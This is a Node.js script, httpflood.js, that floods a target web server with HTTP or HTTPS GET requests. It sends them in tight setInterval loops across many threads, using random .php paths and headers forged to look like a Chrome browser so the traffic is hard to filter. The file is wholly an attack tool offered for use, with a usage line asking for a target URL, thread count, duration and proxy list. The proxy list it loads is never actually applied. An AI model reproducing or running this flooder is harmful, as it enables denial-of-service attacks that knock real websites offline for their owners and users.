const fs = require('fs'), proxies_list = fs.readFileSync(process.argv[5], 'utf-8').match(/\S+/g);

let target_host = process.argv[2], threads = process.argv[3], time = process.argv[4];

var proxies = proxies_list[Math.floor(Math.random() * proxies_list.length)];

if (process.argv.length < 6) {
    console.log('Usage: node httpflood.js <URL> <threads> <time> <proxy_list>');
    process.exit(0);
} else {
    const https = require('follow-redirects').https, http = require('http'), url = require('url'), host = url.parse(target_host).host, options = {
            method: 'GET',
            hostname: host,
            path: '/' + (Math.random() + 1).toString(36).substring(7) + ".php",
            headers: {
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
                accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7,zh-CN;q=0.6,zh;q=0.5,de;q=0.4',
                'cache-control': 'max-age=0',
                'sec-ch-ua': 'Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                Connection: 'Keep-Alive'
            },
            maxRedirects: 20
    };

    for (let i = 0; i < threads; i++) {
        if (target_host.split(':')[0] == 'https') {    
            setInterval(() => {
                https.get(options, function (res) {
                    
                  i++;
                });
            });
        } 
        else {
            
            setInterval(() => {
                http.get(options, function (res) {
                    
                    i++;
                });
            });
        }
    }
}

setTimeout(() => {
    process.exit(0);
}, time * 1000);